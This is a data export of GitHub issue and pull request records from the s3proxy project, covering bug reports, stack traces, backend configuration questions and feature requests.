https://twitter.com/eu_frey/status/1178988097876500481",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/315/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/315/comments,https://api.github.com/repos/gaul/s3proxy/issues/315/events,https://github.com/gaul/s3proxy/issues/315,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/314,510203395,MDU6SXNzdWU1MTAyMDMzOTU=,314,Attach 1.7.0 exectable to release,848247,closed,FALSE,NA,NA,1,2019-10-21T18:49:13Z,2019-10-30T16:33:33Z,2019-10-30T16:33:33Z,OWNER,NA,"GitHub rejected the upload saying that it did not recognize the file type, likely because it is an executable jar instead of a traditional zip/jar file.  They allowed uploading previous releases.  I filed a support ticket with them.",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/314/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/314/comments,https://api.github.com/repos/gaul/s3proxy/issues/314/events,https://github.com/gaul/s3proxy/issues/314,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/313,497667980,MDExOlB1bGxSZXF1ZXN0MzIwNzUyNzIw,313,Removed container root user requirement,4562092,closed,FALSE,NA,NA,1,2019-09-24T12:50:24Z,2021-04-04T02:13:10Z,2021-04-04T02:13:10Z,NONE,NA,"The service will now listen on port 8080 with a regular UID.
The local /data volume can also be written to by this UID.

Tested in OpenShift.",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/313/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/313/comments,https://api.github.com/repos/gaul/s3proxy/issues/313/events,https://github.com/gaul/s3proxy/pull/313,https://api.github.com/repos/gaul/s3proxy/pulls/313
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/312,496689339,MDU6SXNzdWU0OTY2ODkzMzk=,312,v2-or-v4 in example docs,3392931,closed,FALSE,NA,NA,4,2019-09-21T19:03:54Z,2019-09-24T18:19:25Z,2019-09-24T18:19:25Z,NONE,NA,"Hi,

Since `v2-or-v4` is default in the docker image (https://github.com/gaul/s3proxy/commit/456f7c7a0a20f4a35618414ddf1b3037d6bb113b) I think it should be default in the backend examples (https://github.com/gaul/s3proxy/wiki/Storage-backend-examples) because it is a reasonable default and it is not much mentioned in the docs.
If you think that is a good idea I will prepare PR.",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/312/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/312/comments,https://api.github.com/repos/gaul/s3proxy/issues/312/events,https://github.com/gaul/s3proxy/issues/312,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/311,489737219,MDExOlB1bGxSZXF1ZXN0MzE0NDkwNDk1,311,Fixes #299,17711209,closed,FALSE,NA,NA,1,2019-09-05T13:02:45Z,2019-09-06T16:52:26Z,2019-09-06T16:52:15Z,CONTRIBUTOR,NA,"Fixes #299 

Issue:
1. `AmazonS3Client#doesBucketExistV2(String bucketName)`
2. internally uses `AmazonS3Client#getBucketAcl(String bucketName)`
3. The `S3ProxyHandler` thew an exception on a GET Bucket ACL request for buckets that do not exist. 

Fixed it by making sure the `S3ProxyHandler` GET Bucket ACL correctly responds with a 404 if the bucket does not exist. ",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/311/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/311/comments,https://api.github.com/repos/gaul/s3proxy/issues/311/events,https://github.com/gaul/s3proxy/pull/311,https://api.github.com/repos/gaul/s3proxy/pulls/311
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/310,464768063,MDU6SXNzdWU0NjQ3NjgwNjM=,310,Allow disabling features,848247,open,FALSE,NA,NA,0,2019-07-05T20:39:38Z,2019-07-05T20:39:38Z,NA,OWNER,NA,"S3 implementations do not implement all of the AWS functionality.  For testing it might be useful to disable:

* Copy Objects
* List Objects V2
* Multipart Uploads

I suspect that this could be done as a middleware.  @kahing might be useful to you.",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/310/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/310/comments,https://api.github.com/repos/gaul/s3proxy/issues/310/events,https://github.com/gaul/s3proxy/issues/310,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/309,462445828,MDU6SXNzdWU0NjI0NDU4Mjg=,309,Unable to build with JDK 12,848247,open,FALSE,NA,NA,1,2019-06-30T20:56:30Z,2020-07-11T08:07:25Z,NA,OWNER,NA,The ancient 2.0.5 version of error-prone prevents S3Proxy from compiling on JDK 12.  Upgrading error-prone requires at least JDK 8 and addressing #121 should fix this issue.,NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/309/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/309/comments,https://api.github.com/repos/gaul/s3proxy/issues/309/events,https://github.com/gaul/s3proxy/issues/309,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/308,460774469,MDU6SXNzdWU0NjA3NzQ0Njk=,308,Enabling s3proxy trace logs should enable jclouds trace logging,703870,closed,FALSE,NA,NA,2,2019-06-26T05:54:58Z,2021-04-04T00:58:03Z,2021-04-04T00:58:03Z,CONTRIBUTOR,NA,"When s3proxy trace logging is enabled, the jclouds logging should be enabled as well. It's most certainly going to be required to understand whether there is an issue in the actual response from the provider vs s3proxy translation of the response.",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/308/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/308/comments,https://api.github.com/repos/gaul/s3proxy/issues/308/events,https://github.com/gaul/s3proxy/issues/308,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/307,460737083,MDU6SXNzdWU0NjA3MzcwODM=,307,Access denied when i try to connect with AWS S3,52188241,open,FALSE,NA,NA,1,2019-06-26T03:08:04Z,2019-06-27T03:51:58Z,NA,NONE,NA,"Hi,
I am trying to connect to the AWS S3 from the s3proxy. I have used the below configuration. 

```
ENV \
    LOG_LEVEL=""trace"" \
    S3PROXY_AUTHORIZATION=""none"" \
    S3PROXY_IDENTITY=""local-identity"" \
    S3PROXY_CREDENTIAL=""local-credential"" \
    S3PROXY_CORS_ALLOW_ALL=""true"" \
    S3PROXY_CORS_ALLOW_ORIGINS="""" \
    S3PROXY_CORS_ALLOW_METHODS="""" \
    S3PROXY_CORS_ALLOW_HEADERS="""" \
    S3PROXY_IGNORE_UNKNOWN_HEADERS=""false"" \
    JCLOUDS_PROVIDER=""aws-s3"" \
    JCLOUDS_ENDPOINT=""http://s3.amazonaws.com"" \
    JCLOUDS_REGION=""s3-us-west-2"" \
    JCLOUDS_REGIONS=""s3-us-west-2"" \
    JCLOUDS_IDENTITY=""[AWS Access key ID]"" \
    JCLOUDS_CREDENTIAL=""[AWS Secret access key]"" \
    JCLOUDS_KEYSTONE_VERSION="""" \
    JCLOUDS_KEYSTONE_SCOPE="""" \
    JCLOUDS_KEYSTONE_PROJECT_DOMAIN_NAME=""""
```

**But I am getting the error below.** 

```
<Error>
<Code>AccessDenied</Code>
<Message>403 AccessDenied Forbidden</Message>
<RequestId>4442587FB7D0A2F9</RequestId>
</Error>
```

I think i have not used the correct values for my ENV variables. Can any one tell what is the correct values i have to provide for the following variables?

```
JCLOUDS_PROVIDER=""aws-s3"" \  -- ### >###  **Is this correct?**
    JCLOUDS_ENDPOINT=""http://s3.amazonaws.com"" \  **-- >What is the end point in the case of ASWS S3?**
    JCLOUDS_REGION=""s3-us-west-2"" \--> **Can i add my bucket region?**
    JCLOUDS_REGIONS=""s3-us-west-2"" \  --> **Can i Provide S3 bucket region?**
    JCLOUDS_IDENTITY=""[AWS Access key ID]"" \ --> **Can i add my AWS access key to my AWS IAM user account?**
    JCLOUDS_CREDENTIAL=""[AWS Secret access key]"" \ --> **Can i add my AWS Secret access key to my AWS IAM user account?**
    S3PROXY_AUTHORIZATION=""none"" \ -->  **??**
    S3PROXY_IDENTITY=""local-identity"" \ -->**??**
    S3PROXY_CREDENTIAL=""local-credential"" \ -->**??**
```

**Below is my log trace.**

```
[s3proxy] I 06-26 03:06:59.772 main o.g.s.CrossOriginResourceSharing:82 |::] CORS allowed origins: [.*]
[s3proxy] I 06-26 03:06:59.778 main o.g.s.CrossOriginResourceSharing:83 |::] CORS allowed methods: [GET, PUT, POST]
[s3proxy] I 06-26 03:06:59.778 main o.g.s.CrossOriginResourceSharing:84 |::] CORS allowed headers: [*]
[s3proxy] I 06-26 03:06:59.813 main o.g.s.o.eclipse.jetty.util.log:186 |::] Logging initialized @2264ms
[s3proxy] I 06-26 03:06:59.910 main o.g.s.o.e.jetty.server.Server:327 |::] jetty-9.2.z-SNAPSHOT
[s3proxy] I 06-26 03:06:59.961 main o.g.s.o.e.j.s.ServerConnector:266 |::] Started ServerConnector@32767bcf{HTTP/1.1}{0.0.0.0:80}
[s3proxy] I 06-26 03:06:59.962 main o.g.s.o.e.jetty.server.Server:379 |::] Started @2413ms
[s3proxy] D 06-26 03:07:03.952 S3Proxy-Jetty-13 o.gaul.s3proxy.S3ProxyHandler:286 |::] request: Request(GET /)@5cc24bf2
[s3proxy] D 06-26 03:07:03.955 S3Proxy-Jetty-13 o.gaul.s3proxy.S3ProxyHandler:311 |::] header: Upgrade-Insecure-Requests: 1
[s3proxy] D 06-26 03:07:03.956 S3Proxy-Jetty-13 o.gaul.s3proxy.S3ProxyHandler:311 |::] header: Accept-Language: en-US,en;q=0.9
[s3proxy] D 06-26 03:07:03.956 S3Proxy-Jetty-13 o.gaul.s3proxy.S3ProxyHandler:311 |::] header: Host: localhost:8080
[s3proxy] D 06-26 03:07:03.958 S3Proxy-Jetty-13 o.gaul.s3proxy.S3ProxyHandler:311 |::] header: Accept-Encoding: gzip, deflate, br
[s3proxy] D 06-26 03:07:03.958 S3Proxy-Jetty-13 o.gaul.s3proxy.S3ProxyHandler:311 |::] header: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
[s3proxy] D 06-26 03:07:03.964 S3Proxy-Jetty-13 o.gaul.s3proxy.S3ProxyHandler:311 |::] header: Connection: keep-alive
[s3proxy] D 06-26 03:07:03.964 S3Proxy-Jetty-13 o.gaul.s3proxy.S3ProxyHandler:311 |::] header: Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
[s3proxy] D 06-26 03:07:03.967 S3Proxy-Jetty-13 o.gaul.s3proxy.S3ProxyHandler:311 |::] header: Cache-Control: max-age=0
[s3proxy] D 06-26 03:07:03.975 S3Proxy-Jetty-13 o.gaul.s3proxy.S3ProxyHandler:2838 |::] 403 AccessDenied Forbidden {}
```",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/307/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/307/comments,https://api.github.com/repos/gaul/s3proxy/issues/307/events,https://github.com/gaul/s3proxy/issues/307,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/306,460196042,MDU6SXNzdWU0NjAxOTYwNDI=,306,Access Denied issue when connect to Azure Blob storage,52188241,closed,FALSE,NA,NA,4,2019-06-25T03:57:27Z,2019-06-26T02:59:03Z,2019-06-26T02:59:03Z,NONE,NA,"Dear Friends,

I have downloaded the S3Proxy app and modified the docker ENV variables to point to Azure Blob storage. Below is my ENV configuration in the docker file. 

ENV \
    LOG_LEVEL=""trace"" \
    S3PROXY_AUTHORIZATION=""aws-v2"" \
    S3PROXY_IDENTITY=""local-identity"" \
    S3PROXY_CREDENTIAL=""local-credential"" \
    S3PROXY_CORS_ALLOW_ALL=""false"" \
    S3PROXY_CORS_ALLOW_ORIGINS="""" \
    S3PROXY_CORS_ALLOW_METHODS="""" \
    S3PROXY_CORS_ALLOW_HEADERS="""" \
    S3PROXY_IGNORE_UNKNOWN_HEADERS=""false"" \
    JCLOUDS_PROVIDER=""azureblob"" \
    JCLOUDS_ENDPOINT=""https://xxxxxx.blob.core.windows.net/"" \
    JCLOUDS_REGION="""" \
    JCLOUDS_REGIONS=""us-east-1"" \
    JCLOUDS_IDENTITY=""xxxxxx"" \
    JCLOUDS_CREDENTIAL=""xxxxxxxxx” \
    JCLOUDS_KEYSTONE_VERSION="""" \
    JCLOUDS_KEYSTONE_SCOPE="""" \
    JCLOUDS_KEYSTONE_PROJECT_DOMAIN_NAME=""""

When I run the docker container and navigate to the URL, I am getting an error like below. Can anyone help me to understand what is the issue and how to fix it?. 
Note: Using the Azure storage account and the Key, I am able to access the Azure storage in the Microsoft Azure Storage Explorer.

<Error>
<Code>AccessDenied</Code>
<Message>403 AccessDenied Forbidden</Message>
<RequestId>4442587FB7D0A2F9</RequestId>
</Error>",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/306/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/306/comments,https://api.github.com/repos/gaul/s3proxy/issues/306/events,https://github.com/gaul/s3proxy/issues/306,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/305,460117855,MDExOlB1bGxSZXF1ZXN0MjkxMzE0MDM4,305,UploadPartCopy: Fail if improper source range.,703870,closed,FALSE,NA,NA,1,2019-06-24T22:07:50Z,2019-06-24T23:04:00Z,2019-06-24T23:03:48Z,CONTRIBUTOR,NA,"S3Proxy should check the format of the x-amz-copy-source-range value
when handling an UploadPartCopy request. The patch changes the behavior
to return an InvalidArgument error along with the matching error
description to AWS S3. To match the error format, the S3Exception class
is modified to return the actual error message, rather than the String
version of the error code.

Corresponding tests will be added to ceph/s3-tests.

Fixes: #304",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/305/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/305/comments,https://api.github.com/repos/gaul/s3proxy/issues/305/events,https://github.com/gaul/s3proxy/pull/305,https://api.github.com/repos/gaul/s3proxy/pulls/305
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/304,460091702,MDU6SXNzdWU0NjAwOTE3MDI=,304,s3proxy does not reject invalid range headers in UploadPartCopy requests.,703870,closed,FALSE,NA,NA,0,2019-06-24T20:54:58Z,2019-06-24T23:03:48Z,2019-06-24T23:03:48Z,CONTRIBUTOR,NA,"When submitting an UploadPartCopy request to S3Proxy with an invalid source range, the full object is used as the source, as opposed to returning an error. AWS S3 returns the following error message in that case:
```
<Error>
    <Code>InvalidArgument</Code>
    <Message>The x-amz-copy-source-range value must be of the form bytes=first-last
        where first and last are the zero-based offsets of the first and last bytes to copy
    </Message>
    <ArgumentName>x-amz-copy-source-range</ArgumentName>
    <ArgumentValue>0-1024</ArgumentValue>
    <RequestId>[...]</RequestId>
    <HostId>[...]</HostId>
</Error>
```

S3Proxy should return a similar error after validating that the range is specified in the expected format (`bytes=%d-%d`).",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/304/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/304/comments,https://api.github.com/repos/gaul/s3proxy/issues/304/events,https://github.com/gaul/s3proxy/issues/304,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/303,453176788,MDU6SXNzdWU0NTMxNzY3ODg=,303,intermittent getBlob exception,1772540,open,FALSE,NA,NA,6,2019-06-06T18:29:21Z,2020-07-28T08:43:42Z,NA,COLLABORATOR,NA,"I haven't narrowed down what triggers this yet, but goofys CI tests trigger this (unclear which test):

```
java.util.NoSuchElementException: null
        at java.util.ArrayDeque.removeFirst(ArrayDeque.java:285)
        at com.google.common.io.Closer.close(Closer.java:212)
        at org.jclouds.util.Closeables2.closeQuietly(Closeables2.java:40)
        at org.jclouds.io.payloads.ByteSourcePayload.release(ByteSourcePayload.java:52)
        at org.jclouds.http.internal.PayloadEnclosingImpl.setPayload(PayloadEnclosingImpl.java:56)
        at org.jclouds.blobstore.domain.internal.BlobImpl.setPayload(BlobImpl.java:114)
        at org.jclouds.http.internal.PayloadEnclosingImpl.setPayload(PayloadEnclosingImpl.java:97)
        at org.jclouds.blobstore.config.LocalBlobStore.getBlob(LocalBlobStore.java:723)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.lang.reflect.Method.invoke(Method.java:498)
        at com.google.inject.internal.DelegatingInvocationHandler.invoke(DelegatingInvocationHandler.java:37)
        at com.sun.proxy.$Proxy40.getBlob(Unknown Source)
        at org.gaul.s3proxy.S3ProxyHandler.handleGetBlob(S3ProxyHandler.java:1640)
        at org.gaul.s3proxy.S3ProxyHandler.doHandle(S3ProxyHandler.java:673)
        at org.gaul.s3proxy.S3ProxyHandlerJetty.handle(S3ProxyHandlerJetty.java:70)
        at org.gaul.shaded.org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:97)
        at org.gaul.shaded.org.eclipse.jetty.server.Server.handle(Server.java:499)
        at org.gaul.shaded.org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:311)
        at org.gaul.shaded.org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:258)
        at org.gaul.shaded.org.eclipse.jetty.io.AbstractConnection$2.run(AbstractConnection.java:544)
        at org.gaul.shaded.org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:635)
        at org.gaul.shaded.org.eclipse.jetty.util.thread.QueuedThreadPool$3.run(QueuedThreadPool.java:555)
        at java.lang.Thread.run(Thread.java:748)
```",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/303/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/303/comments,https://api.github.com/repos/gaul/s3proxy/issues/303/events,https://github.com/gaul/s3proxy/issues/303,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/302,451293693,MDU6SXNzdWU0NTEyOTM2OTM=,302,Writing from Spark to S3proxy fails with FileAlreadyExistsException,1491094,open,FALSE,NA,NA,0,2019-06-03T05:02:10Z,2019-06-03T05:02:10Z,NA,NONE,NA,"Using the docker image tagged latest for s3proxy with Spark 2.4.1 and Hadoop 2.7.3.

The following pyspark code works when connected to AWS S3:
```
df.write.mode(""overwrite"").save(
    ""s3a://test-bucket/foo"",
    format=""json"")
```
When I run this against s3proxy I get the following error:
```
org.apache.hadoop.fs.FileAlreadyExistsException: Path is a file: s3a://test-bucket/foo/_temporary/0
	at org.apache.hadoop.fs.s3a.S3AFileSystem.mkdirs(S3AFileSystem.java:853)
	at org.apache.hadoop.fs.FileSystem.mkdirs(FileSystem.java:1881)
...
```
Any ideas why I'm getting this error, how I could configure things differently to avoid it, or failing that, where to start on a patch for this behavior? Thanks.",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/302/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/302/comments,https://api.github.com/repos/gaul/s3proxy/issues/302/events,https://github.com/gaul/s3proxy/issues/302,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/301,442524938,MDU6SXNzdWU0NDI1MjQ5Mzg=,301,Support get bucket policy,8564280,closed,FALSE,NA,NA,2,2019-05-10T03:43:17Z,2019-05-11T02:47:11Z,2019-05-10T12:20:49Z,NONE,NA,"When trying to get a bucket policy from `boto3` or directly through `curl`, s3proxy (tag 1.6.1) returns HTTP501:

```
s3proxy_1  | [s3proxy] D 05-10 03:42:24.151 S3Proxy-Jetty-32 o.gaul.s3proxy.S3ProxyHandler:284 |::] request: Request(GET /testbucket?policy)@66a19198
s3proxy_1  | [s3proxy] D 05-10 03:42:24.151 S3Proxy-Jetty-32 o.gaul.s3proxy.S3ProxyHandler:306 |::] header: User-Agent: Boto3/1.9.145 Python/3.7.3 Linux/5.0.9-301.fc30.x86_64 Botocore/1.12.145
s3proxy_1  | [s3proxy] D 05-10 03:42:24.151 S3Proxy-Jetty-32 o.gaul.s3proxy.S3ProxyHandler:306 |::] header: Authorization: AWS4-HMAC-SHA256 Credential=YOUR_ACCESS_KEY_ID/20190510/us-east-1/s3/aws4_request, SignedHeaders=host;x-amz-content-sha256;x-amz-date, Signature=62be47cde74987deba8af696ac47a3a98ea19eff34e8360c00a8b61e410b67e6
s3proxy_1  | [s3proxy] D 05-10 03:42:24.151 S3Proxy-Jetty-32 o.gaul.s3proxy.S3ProxyHandler:306 |::] header: X-Amz-Date: 20190510T034224Z
s3proxy_1  | [s3proxy] D 05-10 03:42:24.151 S3Proxy-Jetty-32 o.gaul.s3proxy.S3ProxyHandler:312 |::] have the x-amz-date heaer X-Amz-Date
s3proxy_1  | [s3proxy] D 05-10 03:42:24.151 S3Proxy-Jetty-32 o.gaul.s3proxy.S3ProxyHandler:306 |::] header: Host: localhost:8000
s3proxy_1  | [s3proxy] D 05-10 03:42:24.151 S3Proxy-Jetty-32 o.gaul.s3proxy.S3ProxyHandler:306 |::] header: Accept-Encoding: identity
s3proxy_1  | [s3proxy] D 05-10 03:42:24.151 S3Proxy-Jetty-32 o.gaul.s3proxy.S3ProxyHandler:306 |::] header: X-Amz-Content-SHA256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
s3proxy_1  | [s3proxy] E 05-10 03:42:24.152 S3Proxy-Jetty-32 o.gaul.s3proxy.S3ProxyHandler:596 |::] Unknown parameters policy with URI /testbucket
s3proxy_1  | [s3proxy] D 05-10 03:42:24.152 S3Proxy-Jetty-32 o.gaul.s3proxy.S3ProxyHandler:2773 |::] 501 NotImplemented A header you provided implies functionality that is not implemented. {}
```

I'm not entirely sure what's going on there unfortunately. The bucket does exist on the remote OpenStack Swift server and is publicly accessible. It looks like s3proxy isn't even requesting from remote in this case though.",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/301/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/301/comments,https://api.github.com/repos/gaul/s3proxy/issues/301/events,https://github.com/gaul/s3proxy/issues/301,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/300,442344242,MDU6SXNzdWU0NDIzNDQyNDI=,300,Multi object delete throws exception when there's no object in request,1772540,closed,FALSE,NA,NA,0,2019-05-09T17:18:04Z,2019-05-20T01:27:54Z,2019-05-20T01:27:54Z,COLLABORATOR,NA,"instead a proper error should have been returned. Backtrace is from 1.6.1:

```
java.lang.NullPointerException: null
        at org.gaul.s3proxy.S3ProxyHandler.handleMultiBlobRemove(S3ProxyHandler.java:1472)
        at org.gaul.s3proxy.S3ProxyHandler.doHandle(S3ProxyHandler.java:688)
        at org.gaul.s3proxy.S3ProxyHandlerJetty.handle(S3ProxyHandlerJetty.java:70)
        at org.gaul.shaded.org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:97)
        at org.gaul.shaded.org.eclipse.jetty.server.Server.handle(Server.java:499)
        at org.gaul.shaded.org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:311)
        at org.gaul.shaded.org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:258)
        at org.gaul.shaded.org.eclipse.jetty.io.AbstractConnection$2.run(AbstractConnection.java:544)
        at org.gaul.shaded.org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:635)
        at org.gaul.shaded.org.eclipse.jetty.util.thread.QueuedThreadPool$3.run(QueuedThreadPool.java:555)
        at java.lang.Thread.run(Thread.java:748)
```",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/300/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/300/comments,https://api.github.com/repos/gaul/s3proxy/issues/300/events,https://github.com/gaul/s3proxy/issues/300,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/299,441727700,MDU6SXNzdWU0NDE3Mjc3MDA=,299,doesBucketExistV2 crashes when bucket doesnot exist on windows,33931640,closed,FALSE,NA,NA,3,2019-05-08T13:11:15Z,2019-09-06T16:52:15Z,2019-09-06T16:52:15Z,NONE,NA,"`Exception in thread ""main"" com.amazonaws.services.s3.model.AmazonS3Exception: java.nio.file.NoSuchFileException: \tmp\s3proxy\test1 (Service: Amazon S3; Status Code: 500; Error Code: 500 java.nio.file.NoSuchFileException: \tmp\s3proxy\test1; Request ID: null; S3 Extended Request ID: null), S3 Extended Request ID: null
	at com.amazonaws.http.AmazonHttpClient$RequestExecutor.handleErrorResponse(AmazonHttpClient.java:1639)
	at com.amazonaws.http.AmazonHttpClient$RequestExecutor.executeOneRequest(AmazonHttpClient.java:1304)
	at com.amazonaws.http.AmazonHttpClient$RequestExecutor.executeHelper(AmazonHttpClient.java:1056)
	at com.amazonaws.http.AmazonHttpClient$RequestExecutor.doExecute(AmazonHttpClient.java:743)
	at com.amazonaws.http.AmazonHttpClient$RequestExecutor.executeWithTimer(AmazonHttpClient.java:717)
	at com.amazonaws.http.AmazonHttpClient$RequestExecutor.execute(AmazonHttpClient.java:699)
	at com.amazonaws.http.AmazonHttpClient$RequestExecutor.access$500(AmazonHttpClient.java:667)
	at com.amazonaws.http.AmazonHttpClient$RequestExecutionBuilderImpl.execute(AmazonHttpClient.java:649)
	at com.amazonaws.http.AmazonHttpClient.execute(AmazonHttpClient.java:513)
	at com.amazonaws.services.s3.AmazonS3Client.invoke(AmazonS3Client.java:4319)
	at com.amazonaws.services.s3.AmazonS3Client.invoke(AmazonS3Client.java:4266)
	at com.amazonaws.services.s3.AmazonS3Client.getAcl(AmazonS3Client.java:3471)
	at com.amazonaws.services.s3.AmazonS3Client.getBucketAcl(AmazonS3Client.java:1168)
	at com.amazonaws.services.s3.AmazonS3Client.getBucketAcl(AmazonS3Client.java:1158)
	at com.amazonaws.services.s3.AmazonS3Client.doesBucketExistV2(AmazonS3Client.java:1293)`",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/299/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/299/comments,https://api.github.com/repos/gaul/s3proxy/issues/299/events,https://github.com/gaul/s3proxy/issues/299,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/298,441287965,MDU6SXNzdWU0NDEyODc5NjU=,298,Backblaze Application Keys,10908330,open,FALSE,NA,NA,8,2019-05-07T15:11:22Z,2019-10-28T15:10:58Z,NA,NONE,NA,"Is it possible to add support for Application Keys which was added in v2 of the Backblze api?

Rather than having to use the main account's master id?",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/298/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/298/comments,https://api.github.com/repos/gaul/s3proxy/issues/298/events,https://github.com/gaul/s3proxy/issues/298,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/297,441228226,MDU6SXNzdWU0NDEyMjgyMjY=,297,Uploading Parquet file using Spark takes AGES (2 minutes) for S3ProxyRule for tiny file,50368735,open,FALSE,NA,NA,4,2019-05-07T13:18:48Z,2019-05-09T06:45:43Z,NA,NONE,NA,"Hi,

Before I start with the problems: S3ProxyRule has been a GREAT way for me to quickly mock up S3 for my Spark code...

BUT

I'm using the S3ProxyRule as part of my unit test that does:
* Upload a test file to the proxy as setup for the test
* consume that file as part of my code under test

The problem is that the UPloading takes a LONG time, where it seems to be doing absolutely nothing... We're talking roughly 120 seconds for uploading a parquet file with 2 records and 2 columns of simple ""foo"" strings.

Any idea what's going on? I'm using Spark 2.30.

If I try to upload the same file to a ""real"" S3 store, it takes about 2 secs.

Thanks!",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/297/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/297/comments,https://api.github.com/repos/gaul/s3proxy/issues/297/events,https://github.com/gaul/s3proxy/issues/297,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/296,436150939,MDExOlB1bGxSZXF1ZXN0MjcyNzAxODM2,296,Add middleware for AES-encryption of payload,3747628,open,FALSE,NA,NA,7,2019-04-23T12:05:07Z,2021-03-19T15:59:23Z,NA,NONE,NA,"This PR introduces a middleware for client-side encryption of the payload with AES-CTR as requested in https://github.com/gaul/s3proxy/issues/126.

The 16 byte initialization vector (IV) and 1 byte size of the IV is stored in the beginning of the payload. This results in a 17 byte difference of the encrypted payload size and the plain text payload size. An alternative could be to store the IV in the user metadata of the payload.

We can configure the following properties to enable the encryption:

```
s3proxy.encrypted-blobstore=true
s3proxy.encrypted-blobstore-key=<SECRET>
s3proxy.encrypted-blobstore-salt=<SALT>
```",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/296/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/296/comments,https://api.github.com/repos/gaul/s3proxy/issues/296/events,https://github.com/gaul/s3proxy/pull/296,https://api.github.com/repos/gaul/s3proxy/pulls/296
